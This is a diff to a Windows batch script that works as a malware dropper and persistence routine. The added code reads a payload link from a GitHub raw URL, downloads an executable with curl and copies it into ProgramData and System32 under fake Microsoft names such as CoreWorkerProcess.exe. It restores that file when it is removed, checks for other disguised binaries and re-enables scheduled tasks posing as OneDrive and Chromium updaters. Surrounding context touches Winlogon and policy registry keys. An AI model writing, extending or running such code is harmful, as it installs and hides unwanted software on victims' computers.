@@ -60,7 +60,9 @@ echo RUNEVERYCALLER.exe is not running. Continue.....
 
 set "CheckSend=0"
 set "lastMinute=none"
-
+set "InstalledQWB=%temp%\MicrosoftLuancher.exe"
+echo Updates : >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
 
 
 ::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
@@ -113,73 +115,8 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
-set "CoreProcess=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
-if not exist "%CoreProcess%" goto INSTCOREPROCESS
 
 
-
-goto NEXT0
-
-
-:INSTCOREPROCESS
-echo :INSTCOREPROCESS
-echo.
-
-
-
-:: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
-
-for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/CoreProcessFileLink') do set "CORPROCESSFILELINK=%%i"
-curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
-
-
-
-:: Checking the existing of the file
-if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
-    echo.
-    echo The download hasn't started yet. Please check your connection.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto INSTCOREPROCESS
-)
-
-
-
-
-
-:: Get the file size in bytes
-for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
-
-
-
-:: Check if the file size is at least 80KB (81920 bytes)
-if %FILESIZE% geq 81920 (
-    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
-) else (
-echo.
-    echo Download incomplete. Check your connection and run the file again.
-	timeout /t 2 /nobreak >nul
-	echo Retrying in 2 seconds ....
-	timeout /t 2 /nobreak >nul
-	echo.
-	goto INSTCOREPROCESS
-)
-
-
-set "MESSAGE=CoreProcessInstalled|"
-set "CheckSend=1"
-
-:NEXT0
-echo :NEXT0
-echo.
-
-
-
-:: IF CoreWorkerProcess.exe is installed
 
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit
 
@@ -196,6 +133,35 @@ echo.
 :EVERYSECOND
 echo :EVERYSECOND
 echo.
+
+
+
+
+
+:CWP
+echo :CWP
+echo.
+
+:: Define the paths
+set "sourceFile=%SystemRoot%\System32\CWProcess.exe"
+set "startupFile=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+
+:: Check if the file exists in the Startup folder
+if not exist "%startupFile%" (
+    echo File not found in Startup folder. Restoring...
+    copy "%sourceFile%" "%startupFile%"
+) else (
+    echo File is already in %startupFile%.
+)
+
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
 
 
 :SHST
@@ -215,6 +181,7 @@ if not exist "%startupFile%" (
 )
 
 timeout /t 1 /nobreak >nul
+
 
 
 
@@ -292,7 +259,7 @@ set "file1=%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
 set "file2=%ProgramData%\Microsoft\Windows\ShellHost.exe"
 set "file3=%ProgramData%\Microsoft\Windows\KMSAuto.exe"
 set "file4=%APPDATA%\Microsoft\nircmd.exe"
-
+set "file5=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
 
 
 :: Check each file
@@ -300,11 +267,26 @@ if not exist "%file1%" goto STARTUPTAASK
 if not exist "%file2%" goto STARTUPTAASK
 if not exist "%file3%" goto STARTUPTAASK
 if not exist "%file4%" goto STARTUPTAASK
+if not exist "%file5%" goto STARTUPTAASK
 
 
 
 :: If all files are found, continue with other tasks
 echo All files found.
+
+echo COM Surrogate.exe Found in %file1% >> "%InstalledQWB%"
+echo ShellHost.exe Found in %file2% >> "%InstalledQWB%"
+echo KMSAuto.exe Found in %file3% >> "%InstalledQWB%"
+echo nircmd.exe Found in %file4% >> "%InstalledQWB%"
+echo CoreWorkerProcess.exe Found in %file5% >> "%InstalledQWB%"
+
+
+
+
+
+
+
+
 goto COMMANDSFORAGENTS
 
 
@@ -327,6 +309,80 @@ goto COMMANDSFORAGENTS
 :STARTUPTAASK
 echo :STARTUPTAASK
 echo.
+
+
+
+
+
+
+
+:CheckCWP
+echo :CheckCWP
+echo.
+
+
+
+:: Check CoreWorkerProcess.exe; if found, skip to CheckComSurrogate
+if exist "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" (
+    goto CheckSHST
+)
+
+
+
+
+:: Kill & Delete file 
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/CoreProcessFileLink') do set "CORPROCESSFILELINK=%%i"
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
+
+
+
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto INSTCOREPROCESS
+)
+
+
+
+
+
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+
+
+
+:: Check if the file size is at least 80KB (81920 bytes)
+if %FILESIZE% geq 81920 (
+    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%SystemRoot%\System32\CWProcess.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto INSTCOREPROCESS
+)
+
+
+set "MESSAGE=CoreProcessInstalled|"
+set "CheckSend=1"
+
+
+
+
+
+
+
 
 
 
@@ -537,14 +593,18 @@ echo.
 :: Define tasks to check
 set "Task1=OneDrive Updater"
 set "Task2=OneDrive Task"
-set "Task3=Microsoft Update"
+set "Task3=Chromium Update"
 
 
 :: Check if "OneDrive Updater" & "OneDrive Task"  exists & Enable them if disabled
 schtasks /query /tn "%Task1%" >nul 2>&1 || schtasks /query /tn "%Task2%" >nul 2>&1 || schtasks /query /tn "%Task3%" >nul 2>&1 || goto TASKSEVERY
+
 schtasks /query /tn "%Task1%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task1%" /enable)
 schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task2%" /enable)
-schtasks /query /tn "%Task2%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task3%" /enable)
+schtasks /query /tn "%Task3%" /fo LIST | findstr /I "Disabled" >nul && (schtasks /change /tn "%Task3%" /enable)
+
+echo %Task1% and %Task2% and %Task3% is Installed and Enabled in TaskScheduler : >> "%InstalledQWB%"
+
 
 
 goto AFTERTASKSEVERY
@@ -806,6 +866,11 @@ schtasks /query /fo LIST /v > "%TASKS_DATA%"
 
 :: make x empty lines to %LOGFILE1% then type taask scheduler .....
 (for /l %%i in (1,1,6) do echo.) >> "%LOGFILE1%"
+type "%InstalledQWB%" >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
+echo. >> "%LOGFILE1%"
 echo Task Scheduler :  >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
 echo. >> "%LOGFILE1%"
